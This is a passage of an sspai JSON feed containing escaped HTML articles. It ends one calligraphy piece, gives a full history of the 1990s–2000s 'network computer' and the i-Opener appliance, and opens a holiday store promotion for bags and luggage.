src=\"https://cdn.sspai.com/editor/u_/c56jbilb34taj5bdoccg.jpeg\"><figcaption>上：复刻了 ER 的电脑字库 Snell Roundhand，下：ES，书写者 W. A. Baird</figcaption></figure><p>可以看出，上图中的 ER 有比 ES 更圆滑、更明显的过渡。</p>\n<h3>Ornamental Penmanship</h3>\n<p>Ornamental Penmanship（以下简称为 OP）是另一种需要弹性点尖书写的字体，其特点是大写字母大量的装饰性成分，以及流畅的游丝与厚重的 shade 之间极高的对比度。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbilb34taja4roeh0.jpeg\"></figure><p>作为 Spencerian 家族的字体，OP 也尽可能采用「真」连笔——如果你的书写技术过硬，想要在不抬笔的情况下快速书写整个单词是完全可能的。</p>\n<p>当今最为知名的 OP 衍生作品或许是可口可乐 logo。有记载称，书法家 L. Madarasz 曾对自己的学生说可口可乐的商标出自他手。虽然我们很难验证这一说法是否正确，但从 Madarasz 的其他作品中可以看出，这确实是他的风格：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbitb34takvpmm010.jpeg\"><figcaption>上：可口可乐标志，下：Madarasz 书写的 Washington</figcaption></figure><p>虽然相同的风格并不能从逻辑上证明可口可乐 logo 确实是由 Madarasz 书写的，但 penmanship 文献中会书写这种字母的 penman 似乎只有 Madarasz。</p>\n<h3>Business Penmanship</h3>\n<p>Business Penmanship（以下简称 BP）是 Spencerian 家族的又一成员，它也是我们将见到的唯一一个不需要特殊的书写工具，只要圆珠笔就能书写的字体。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbj5b34takvpmm01g.jpeg\"><figcaption>书写者：E. C. Mills</figcaption></figure><p>BP 看似简单，但实则需要书写者及大量的练习才能获得理想的书写效果，因为我们追求的是流畅而没有颤抖痕迹的线条。</p>\n<h3>Old English</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbjdb34takvpmm020.jpeg\"><figcaption>Old English 字母表，由 W. E. Dennis 书写，收录于著作 Palmer’s Penmanship Budget</figcaption></figure><p>Old English（以下简称 OE）是将古本中的哥特字体进行了现代化演绎的产物。理想中的 OE 具有极端锋利的棱角，这一特点尤其体现在「尖得戳人」的菱形装饰笔画中。</p>\n<p>显然，想要书写出如此精致的字体，需要非常充足而细致的准备。一般来说，一份 OE 的草稿需要为每个笔画进行定位——这就要求书写者根据自己笔画的宽度在纸上制作网格。大部分尖锐的笔画则需要在主笔画完成之后进行补笔。</p>\n<h2>结语</h2>\n<p>对于没有学习过的人来说，calligraphy 是一门既陌生，又让人充满好奇艺术。本文简要地介绍了一些从未接触过 calligraphy 的读者最关心的问题：什么是 calligraphy？那些炫酷的笔画是怎么实现的？</p>\n<p>在关于 calligraphy 的第二篇文章中，我将介绍如何从零开始准备学习书写 calligraphy， 它的兴趣社群在国内外看起来是什么样，并提供一些可供参考的范本数据库。</p>\n<h4><strong>关联阅读</strong></h4>\n<ul>\n<li><a href=\"https://sspai.com/post/66901\" target=\"_blank\">我为什么还在使用钢笔？</a></li>\n<li><a href=\"https://sspai.com/post/67584\" target=\"_blank\">不买可以先收藏 07：从自用到送礼，帮你选支好钢笔</a></li>\n<li><a href=\"https://sspai.com/post/63305\" target=\"_blank\">被忽视的设计：中文字体</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注<a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，让你的生活更精彩 🎉</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68953"},{"title":"20 年前的「网络电脑」和搁浅的「网上冲浪自由」","date":"2021-09-26 06:30:39","description":"\n<h3><strong>专栏文章 首页推荐</strong></h3>\n<p>少数派专栏是 Matrix 社区中的一部分，我们会不定期挑选专栏中最优质的文章，展示来自用户和开发者的真实体验和观点。<a href=\"https://sspai.com/post/65959\" target=\"_blank\">点此</a> 了解什么是少数派专栏，<a href=\"https://sspai.com/columns\" target=\"_blank\">点击</a> 查看全部少数派专栏。</p>\n<p>本文来自 <a href=\"https://sspai.com/column/270\" target=\"_blank\">掌故新志</a> 专栏，再次端详旧时代的弧光。关注专栏，随时掌握最新资讯。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>得益于 iCloud 续命，我的 64G 容量的 iPhone 6 ，得以「存储着」近万照片扛到去年，等到256G 容量的 iPhone 12 接棒。如今类似 iCloud 和 Google Drive 这样「无缝嵌入」的云服务真正开始惠及用户，这也是 Chromebook 身为电脑，却能以 16GB 存储起步开卖的底气。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/article/001ade8a59443bca103ef1256c4276db\"></figure><p>但是完全去本地存储的「网络设备」，即便在今天，依然会让人觉得不安，别说万兆光纤了，你永远不知道隔壁小区修路的挖掘机一铲子挖断的线路什么时候能接上。5G 就更别说了，看看社区的投票吧：<a href=\"https://sspai.com/bullet/1630048406\" target=\"_blank\">你会在日常生活中使用 5G 网络吗？</a></p>\n<p>经验往往是在被生活持续不断地毒打中建立起来的。但是在此之前 —— 比如需要拨号上网的时代，头铁的人还是很多的：</p>\n<blockquote>\n<p>突然间，当网络变得又快又便宜时，我们必须重新思考我们接入网络的设备类型……当我们谈论网络计算机时，很多人会说那是一个愚蠢的硬件设备……我们真正做的是去掉硬盘。而替代硬盘的，是快速的网络连接，并让其他人负责维护你的硬盘硬件和上面的内容……操作系统应该是匿名的，每个人都可以通过网络获得并使用相同的版本……我认为将会出现一类新型的电脑，以网络为中心。</p>\n<p>——Larry Ellison，1995 年 11 月 27 日，发布于杂志 《Soft-Letter》</p>\n</blockquote>\n<p>Larry Ellison 并不是一个没有名字的男同学。也许你没有听说过甲骨文公司，也不了解苹果董事会成员是啥概念，但是如果你看过《钢铁侠 2》这部电影，那么你一定见过 Larry Ellsion。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/article/1dbf112109310499f150872374d21808\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/article/0de370e77cc942f896cc3b2c0e48fdf5\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/article/31ff83a403d764a14d660c4f404d9008\"></figure><blockquote>\n<p>Happy：「This is Larry. Hey, the oracle of Oracle.」</p>\n<p>Tony Stark：「What a pleasure. Nice to see you.」</p>\n<p>Larry Ellison：「Call me! Call me!」</p>\n</blockquote>\n<p>Happy 带着 Tony Stark 穿过人群，在下行的楼梯上和甲骨文的创始人 Larry Ellison 握手，并非常紧凑地玩了双关。同样是出现在《钢铁侠 2》中的科技圈大佬，Larry 的话题性不如 Elon Mask ，至少在社交媒体上是这个样子。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/f904c5ef97c6eb8fc412eb067b1ea9ec.png\"></figure><p>先不说钢铁侠的事情。Larry 在 26 年前对于互联网和硬件之间的关系的看法，其实是足够有前瞻性的，毫无疑问。只是他很大程度上高估了高速网络的普及速度，以及本地存储在此后几十年间的必要性。</p>\n<p>Larry 的构想以 2021 年的视角来看，依然是激进的。不过和所有的科技概念刚刚冒头的时候一样，「互联网设备」足够吸引人，至少，1996 年刚回苹果的乔布斯差点就上了 Larry 的这趟车。</p>\n<blockquote>\n<p>在 1996 年 5 月乔布斯回归之前，苹果公司加入了由甲骨文公司（OracleCorporation）和其他 30 家硬件、软件公司组成的网络计算联盟，为基于一个公用网络平台的低价位、无磁盘的计算机设立了标准。乔布斯最好的朋友亿万富翁拉里·埃里森（Larry Ellison）格外看好网络计算机在计算机工业的发展前景。并且，作为苹果公司董事会的新成员，埃里森对媒体透露，苹果公司正在研发一款新的网络计算机。甚至，他最近还投资了一家新的网络计算有限公司，想开始在这一领域施展拳脚。</p>\n<p>——《乔纳森传》</p>\n</blockquote>\n<p>此时，正是 iMac G3 的设计阶段，硬件配置要如何选取，即将要确定下来。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/24/article/c898a087deb4759dafd9fd455a34cd35\"></figure><p>不过，好在乔布斯还算清醒，最后没有让扭转大局的 iMac G3 变成一台没有硬盘的网络设备：</p>\n<blockquote>\n<p>乔布斯认为网络电脑应该升级成为一个有着更大硬盘和光驱的真正的电脑。为了避免延误，鲁宾斯坦提议硬件的设计应该基于麦金塔 G3 电脑。这种电脑面向专业人士，在乔布斯接手苹果之前就已经开始研发，此时刚刚发布。增加硬盘和光驱意味着要扩大蛋形的外壳，不过这仅仅是比例的放大，因此操作相对简单。</p>\n<p>——《乔纳森传》</p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/article/13d4194df812aba0d1d4cf86c8c68c11\"><figcaption>苹果和万代共同完成的 Pippin</figcaption></figure><p>其实在苹果公司面对「互联网设备」或者说「网络电脑」这个「风口」的，并不只有乔布斯。乔布斯回归苹果之前，苹果曾和万代合作推出过一款网络游戏终端 PipPin。虽然产品本身介乎家用游戏机和网络设备之间的模糊定位，加上高昂的价格、不成熟的合作模式，都是导致失败的原因，但是这个失败的产品，依然让乔布斯对于网络电脑的概念有所迟疑，并最终放弃。</p>\n<p>想跟着风口青云直上的人很多，但是会判断风口的人并不算多。</p>\n<h2>「网络电脑」时代的化石 </h2>\n<p>20 年前，跟 Larry 上了车的人依然不少，而 Larry 也以身作则地搞出了 NIC，虽然 NIC 最终跻身 PC World 当年评选的史上最失败电脑 Top 10 列表并位列第九。同期上车的其他品牌，最终的产品其实也相差仿佛，同样失败。</p>\n<p>而「网络电脑」和「互联网设备」之所以能够进入我的视野，还是因为最近到手的这一把老键盘：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/article/bf576f797005efc79dc5d4aa06723ed7\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/24/b347d70f7922c2f91783eb650ac27478.png\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/24/368183fcfcc4a950873328f9539bffa9.jpg\"></figure><p>这把独特的键盘，就是当年诸多失败的网络电脑产品之一 —— i-Opener 的组成部分。i-Opener 的定位是面向初次使用互联网的「廉价网络电脑」：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/cad619b3a5327e78f71f14f27fa32c48.png\"></figure><p>独特的 Pizza 按键，将鼠标改成方向键+功能键的模式集成在键盘上，将电脑功能直接做成快捷方式一键访问，缺少 ESC 按键，诸多打破常规又「匠心独运」的设计，是我决定入手这把键盘的主要理由。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/4e1bbb9d2352919b618a06ef0947ad9d.png\"></figure><h2>99 美元的网上冲浪自由</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/17d52d3b86fc636e4b5ce58fea2a2354.png\"><figcaption>图片来自 retrogamingmuseum.com</figcaption></figure><p>在 2000 年的美国，超过一半的普通人是没有接触过电脑的，带着硕大的 CRT 显示屏的个人电脑依然是一个昂贵的「大件」。个人电脑功能丰富，说明书厚度堪比辞典：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/24/65044797ac4ad59cea168ba0a46f1b33.jpg\"><figcaption>我在旧书店 15 元购得的 Windows 说明书，一直被用来当杯垫</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/f64b78c0c84b493ef87b13c50f30baa6.jpg\"><figcaption>厚度了得</figcaption></figure><p>在这个时代，即使是最简单的个人电脑都需要复杂的配置之后方才能够使用。但是在这个所有人都期待能用上电脑，接入网络，开始冲浪。且不说昂贵的电脑硬件，即使你已经拥有，想要接入网络，你还需要跟随说明书进行复杂的设置，找到对的程序，进行正确的配置……对于新手用户，这是一条太过复杂和遥远的路径。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/f8b730e789d136e11e9c1a21741be5f2.png\"><figcaption><i>Windows 98 的控制面板</i></figcaption></figure><p>如果，一台开箱即用的「网络电脑」只需要 99 刀，不用纠结文件存哪里，一键下单披萨，一键打开邮箱，一键实现网上冲浪自由呢？这就是 i-Opener 最初的产品逻辑。</p>\n<h2>上手即用的「简约」</h2>\n<p>平心而论，i-Opener 的想法也确实很有苹果 i 字头产品的特征（从时间节点上来看也确实在蹭苹果的热度）：</p>\n<blockquote><p>这个想法是创建一个带有软件的硬件产品，允许客户在不需要「拥有一台计算机」的情况下上网和发送和接收电子邮件……目标是尽可能轻松快速地「开箱即用」。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/4d3decb726cbf6d6b18c6879572f2729.png\"></figure><p>拿到早期版本的 i-Opener 的洛杉矶时报记者Ashley Dunn，是这样评价它的开箱体验：</p>\n<blockquote><p>我开箱 i-Opener 的第一步是扔掉说明书……它的快速入门指南仅仅涵盖七个简单步骤：第 1 步到第 4 步是关于如何打开包装的……第 5 步是关于如何插入电话线，第 6 步是如何将计算机插入墙上的电源插座，第 7 步只是通知你安装过程已结束了。</p></blockquote>\n<p>坦率讲，它距离上网本似乎只有一步之遥，不过做成桌面端设备，相对硬件研发成本能够节省不少。</p>\n<p>对于「网络电脑」这一概念的极致概括，就是一个「承载浏览器用来上网的硬件」。再无其他。如果需求被简化到这个程度，i-Opener 和同类产品的硬件配置……也可以做得「极致简约」了。</p>\n<h2>紧凑的硬件搭配方案</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/0e1b96f9566671b6731b5c44d7de5dfe.png\"><figcaption>图片来自<a href=\"https://www.targetpc.com/hardware/internet_appliance/i-opener/\" target=\"_blank\"> TargetPC.com</a></figcaption></figure><p>i-Opener 的生产成本高昂的原因之一，是它使用了 10 英寸的液晶显示器，虽然只有 800x600 的分辨率，但是在 CRT 大脑袋显示器满街走的时代，已经是下血本的选择了，尤其当它把市场推广价定在 99 刀 的时候（它的实际生产成本在单台 300 美元以上）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/1b711cb8f892ac5db34b0c168efcfb6a.png\"></figure><p>作为一台 2001 年发售的电脑 ，i-Opener 内置的 200Mhz 的 x86 架构的 CPU，仅仅相当于4年前的奔腾 2 的水准，内置 32M 的内存用来运行程序。另外，这台网络电脑，是没有硬盘的。</p>\n<p>主板直接集成在屏幕之后，除了电源和网线接口，主板还有留有打印机和键盘的 PS2 接口。简单来说，它有着同时代笔记本电脑的尺寸，又带来比桌面端电脑更加轻便小巧的使用体验。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/24/c591a680866cf8ca9a1d74e00afafba3.JPG\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/24/c5ed2fe9c9c5ffb9c2f1b4ec1b713c1e.JPG\"></figure><p>而为了尽可能精简输入的硬件设备，i-Opener 并没有配备标准的键盘鼠标套件，而是将鼠标的方向控制、左右键直接精简到键盘上，思路还是相当宽广的。</p>\n<h2>极端精简的系统</h2>\n<p>i-Opener 所采用的系统其实也不是生面孔——它使用的是高度定制版的 QNX 系统（之后黑莓的平板电脑，同样是基于 QNX 来进行开发的）。</p>\n<blockquote><p>「我们希望让 85 岁的老奶奶同样能够流畅使用它。」</p></blockquote>\n<p>从它的愿景上来看，非常有白居易的味道了，这种对于用户体验的追求……并不算低。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/06eca885abed53c893e6cf255c9f6b7b.png\"></figure><p>只是，这种功能和体验上的「简约」还存在另外一面，也就是它不得不把功能彻底固化：没有第三方应用，几乎没有其他的任何拓展性，每一个功能和键盘上的按键都一一对应，足够具体，足够简单……没有其他。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/1551edb480c11c3f159fe5af0f8437c6.JPG\"></figure><p>尤其值得一提的是，它在原来 Windows key 的位置所设置的 Pizza 键，简直充满灵性！单击它可以直达 连锁 Pizza 品牌 Papa John's 的网站，直接下单外卖！当然，用户也可以通过设置，将它更换成其他连锁品牌的 Pizza 快捷方式。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/24/ceb3c672586940bc63e821be83fcb9d5.JPG\"></figure><p>i-Opener 并没有将自己定义为一个单纯的硬件厂商，而是一个「定制化服务综合体」。这个定制化系统之下，系统内置的 Web Guide 导航页会将用户直接引导到天气、金融、体育、购物、邮件等对应的页面，这些通常是固定的服务供应商，不过用户同样可以输入网站地址直接访问特定的网站。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/b7303f7b324e9cce27f64dfbf3cffecc.png\"></figure><p>虽然这是台「网络电脑」，但是非常实际地考虑到离线的问题。虽然硬盘被干掉了，但是其中内置了一个16M 的闪存芯片作为缓存，是用来存储每 4 小时更新一次的订阅信息 —— 系统会在后台将新闻、体育、金融信息等离线下来，供用户离线阅读。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/f1a585f3192f3a36fae33968cc491cdf.png\"></figure><p>当收到新邮件的时候，显示器旁边的 LED 灯会亮起。</p>\n<blockquote><p>「与其说这是电脑，不如说这是一台家用电器……特别适合摆在床头或者咖啡机旁边。」</p></blockquote>\n<p>对于动手能力比较强的用户而言，他们并不这么看。</p>\n<h2>硬件玩家的逆袭</h2>\n<p>将成本在 300 美元以上的设备卖到 99 美元，即使是在推广期，这也是很大胆的事情。Netpliance 敢这么做很大程度上，是因为他们基于这套定制的软硬件以及购物服务，收取每月 21.95 美元的「网费」。这种订阅机制，我们听起来并不陌生。逻辑上，只要整套体系运作得没有大的问题，一切都好说。</p>\n<p>但是 Netpliance 低估了 i-Opener 用户对于本地存储的需求，以及硬件爱好者的动手能力，尤其是后者。</p>\n<p>有一位名叫 Segler 的硬件工程师在主板上发现了有硬盘位的标识，这意味着他只需要制作一条对应的转接线，即可外接硬盘，将它变成一台标准的台式机电脑。随后他在相关的 Linux 社区上发布了他的改装成果，随后他迅速接到了 200 多份制作改造线缆的订单，而他收取每条 35美元，而这也意味着，只需要 134 美元即可拥有一台颇为不错的完全体的个人电脑。</p>\n<p>随后，即使 i-Opener 把零售价拉到 199 美元，也没能阻止蜂拥抢购的用户。随之而来的，是 Netpliance 的股价崩盘，而这台 i-Opener 也成为了「网络电脑」这一类产品中的反面典型。</p>\n<p>「网上冲浪自由」最终还是没能实现，至少是在 i-Opener 上没能实现。</p>\n<h2>没有 ESC 按键，时代的挽歌</h2>\n<p>第一眼看到这个键盘的时候，最戳中我的事情，是 i-Opener 的键盘上没有 Esc 按键。</p>\n<p>在那个《黑客帝国》横扫市场的时代，电影中带着暗色调的未来隐喻，和全民争先上网的现实，构成了有趣的对比。这个将 Win key 换成披萨的键盘，似乎在用消失的 Esc 按键来期待一个「永远在线的美好时代」—— 立等可取的商品、随性自由的网络冲浪自由，永远不用离开。</p>\n<blockquote>\n<p>穿新衣吧剪新发型呀</p>\n<p>轻松一下WINDOWS98</p>\n<p>以后的路不再会有痛苦</p>\n<p>我们的未来该有多酷</p>\n<p>——朴树《New boy》，《我去2000年》专辑</p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/011ac8579894c4111e17a57bcaf560bf.jpg\"><figcaption>彼时安装 Windows 98 需要厚厚的一搭软盘</figcaption></figure><p>而今天，我们似乎正生活在一个曾经无比期待的时代，万兆光纤，5G 网络，每一个实体键盘上都有 Esc 键盘。但是这个标配的按键更像是一个装饰，7x24 在线的工作/协同，工作生活互相入侵，人生焦灼。</p>\n<p>目标达成，但一切似乎并不是我们期待的那个未来。</p>\n<p>缺少 Esc 按键的时代我们期待网络， Esc 按键无处不在的时代我们无法断开网络，我不知道哪个更讽刺。</p>\n<h4>参考来源：</h4>\n<ul>\n<li><a href=\"https://www.washingtonpost.com/wp-dyn/content/article/2007/03/19/AR2007031900296.html\" target=\"_blank\">https://www.washingtonpost.com/wp-dyn/content/article/2007/03/19/AR2007031900296.html</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/I-Opener\" target=\"_blank\">https://en.wikipedia.org/wiki/I-Opener</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/New_Internet_Computer\" target=\"_blank\">https://en.wikipedia.org/wiki/New_Internet_Computer</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/New_Internet_Computer\" target=\"_blank\">https://www.latimes.com/archives/la-xpm-2000-mar-09-fi-6888-story.html</a></li>\n<li><a href=\"https://www.chicagotribune.com/news/ct-xpm-2000-04-24-0004240004-story.html\" target=\"_blank\">https://www.chicagotribune.com/news/ct-xpm-2000-04-24-0004240004-story.html</a></li>\n<li><a href=\"http://www.jklp.org/profession/papers/netpliance/netpliance.html\" target=\"_blank\">http://www.jklp.org/profession/papers/netpliance/netpliance.html</a></li>\n<li><a href=\"https://www.worthpoint.com/worthopedia/vintage-netpliance-computer-opener-1802435379\">https://www.worthpoint.com/worthopedia/vintage-netpliance-computer-opener-1802435379</a></li>\n</ul>\n","link":"https://sspai.com/post/68960"},{"title":"十一将至，出门远行的你可能需要这些","date":"2021-09-26 06:02:33","description":"\n<p>国庆假期即将到来，不管你打算出门远行还是在家休息，少数派商店又为你准备了些实用的玩意。来自 tomtoc 三款形态各异的背包可以满足你出门随身轻便携的需求。想要装的更多？不妨看看地平线 8 号行李箱。另外出门在外移动电源自然少不了，也别忘了随时用用酒精湿巾擦手防疫。</p>\n<p>⏰ <strong>活动详情</strong></p>\n<p>时间：9.26 ~ 9.28</p>\n<p>优惠：部分参与跨店每满 ￥200 减 ￥10</p>\n<p><a href=\"https://shop549593764.taobao.com/index.htm?spm=2013.1.w5002-18497266160.2.2fa346beBU2yc8\" target=\"_blank\">进店看看 &gt;</a></p>\n<h2>🧳 箱包专场</h2>\n<h3>tomtoc 系列</h3>\n<ul>\n<li>\n<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=654443376513\" target=\"_blank\">H02 斜挎包：</a>￥189 <s>原价￥219</s>\n</li>\n<li>\n<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=607457517577\" target=\"_blank\">H61 少数派联名双肩包：</a>￥624 <s>原价￥699</s>\n</li>\n<li>\n<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=656442566375\" target=\"_blank\">A61 双肩包：</a>￥319 <s>原价￥349</s>\n</li>\n</ul>\n<p>tomtoc 是少数派的老朋友了，之前曾经联合他们推出了 <a href=\"https://sspai.com/post/63962\" target=\"_blank\">H02 斜挎胸包</a> 的特别定制款，暗色+一抹黄的设计得到了不少朋友的喜爱，而今次我们也上架了该型号的其他颜色，相同的设计，拥有 4 种不同的颜色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/14db78677fb1883374c729fe4163105b.GIF\"></figure><p>H61 是一款看起来平平无奇，但摸到实物后满心惊喜的产品。它外面料绝大部分都采用的是弹道尼龙 840 材料，有着耀眼但又沉稳的哑光光泽，并且在防水涂层和电脑仓 YKK 防水拉链的加持下，确保了日常通勤时大部分场景和突发状况下的正常使用及全面保护。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2019/11/07/ca4b3011456cc9fb4259601a6e8c9cf2.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"\"></figure><p>如果你想要更加个性的设计，A61 也是不错的选择，延续了卷口的设计元素，更加时尚前卫，可根据装载需求调整容量，常规 17L，扩展后可达到 22L。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/25/7867f21907537ea235859dc7371590d8.png\"></figure><p><strong>相关体验：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/57318\" target=\"_blank\">或许能成为你的全能背包：少数派 x tomtoc H61 定制双肩包</a></li>\n<li><a href=\"https://sspai.com/post/63962\" target=\"_blank\">一个小包就能胜任你的日常出行：少数派 x tomtoc 斜挎胸包</a></li>\n</ul>\n<h3>少数派单肩包</h3>\n<p>¥99 <s>原价￥149</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?spm=a1z10.3-c-s.w4002-22968806714.9.2c3861f0XtbVuw&amp;id=613461349762\" target=\"_blank\">点这买 &gt;</a></p>\n<p>能让你轻松出门的少数派定制单肩包，宽 25cm × 高 17.5cm，背带长度为 70 - 135 厘米且可自由调节长度，共有两个口袋：大主袋和外侧拉链收纳袋，可以轻松容纳下日常必带物品：手机、钥匙、钱包、证件卡盒……非常适合日常随手抓一个背包就出门，能装又无负担。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/25/article/353e230574020e386e826306685b542c\"></figure><h3>地平线八号行李箱系列</h3>\n<ul>\n<li>\n<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/1y582ayg7k7f4?step=1\" target=\"_blank\">20 寸：</a>￥299（冰川粉 / 曜石黑 / 深海蓝）</li>\n<li>\n<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/2x5auh5w7nmr4q9?step=1\" target=\"_blank\">24 寸：</a>￥439 <s>原价￥499</s> （冰川粉 / 极光绿 / 芥末绿）</li>\n</ul>\n<p><strong>@waychane 在用：20 寸周游记限定系列</strong></p>\n<p>由于经常出差，我对行李箱的需求首先是能够登机，减少落地之后提取行李的等候时间；其次是好推，拉杆的稳定性、滑轮顺滑性以及静音型，都是需要考量的方面；「好看」是最后也是非常重要的一点，行李箱在身边也算半件「服饰」，谁也不想拖着图案奇怪、质感「低劣」的箱子在身边。</p>\n<p>过去几年，我一直在用「地平线 8 号」推出的行李箱产品，好推好拉、设计也足够简洁，满足了上述全部需求，价格也相对合理；当然，近期收到的这款「周游系列行李箱」也不例外。这款行李箱的尺寸为 20 英寸，能够轻松带上飞机，3 日以内的差旅出行使用也绰绰有余。拉杆和滑轮作为「地平线」产品的强项，自然也不用多说，拖行顺畅、提拉轻松；我的老款行李箱经过几年使用之后，拉杆和滑轮的状态依然非常稳定，耐用性也不必再提。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/422a923b686178804a4807807f0a6d0e.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>相比之下，「周游系列」的箱体设计整体更为圆润，观感于我而言更为舒适；这款行李箱还采用了被称为「不等分设计」的造型，侧面拉链部分具有弧线设计，算是设计中的一处小细节。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/e3c714d5ea2e3879377ea38f7cc13d95.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>这款行李箱还贴心地提供了一个收纳包，收纳包尺略小于 12.9 英寸 iPad Pro，非常「能装」，透明且防泼水的面料进一步增加了这款「配件」的实用性。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/e548669b4b0f52eece91c7d359db695c.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p><strong>@吃派的水獭 在用：24 英寸托运箱</strong></p>\n<p>我一直是地平线箱子的忠实用户，最初大概是因为锤子的原因，让我对这个品牌印象不错。</p>\n<p>之前一直在用 20 寸登机箱，作为首发用户一直用了三年多，质量非常靠谱。这次同事寄来了 24 寸的版本让我体验，直观的感受就是大了许多，像是「Pro Max」版本，外表还是熟悉的颗粒 PC 表面，虽说对贴纸不太友好，但好处是真的很耐磨扛脏。该系列的静音万向轮真的体验绝佳，顺滑、静谧，像是装了什么减震装置。我收到的这款「芥末绿」版本复古清爽，再适合秋天不过了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/904136d90d92c999ac368bddd96b5411.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>左：20 寸，右：24 寸</figcaption></figure><p>作为一个箱子本身的功能性其实没什么好说的，卡扣固定、拉链分区该有的都有，挑一个比较实用的说说：在拉杆的下方贴着一个小程序码，可以扫码注册会员绑定商品信息，方便日后保修。而对于陌生人来说，这则是一个电子行李挂牌，扫码就可以查看你填写的个人信息，方便拾取捡到后与你进行联系，解决了实体行李牌公开展示个人信息的隐私问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/a150ca194ea873ccf3a21bf4278ee64e.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h2>🚞 外出便携</h2>\n<h3>普特博卡片式便携洗手液</h3>\n<p>50 片装 ¥36 <s>￥60</s> / 100 片装 ¥60 <s>￥100</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=654004975114\" target=\"_blank\">点这买 &gt;</a></p>\n<p><strong>@吃派的水獭：</strong>最近商店要上新，@问路 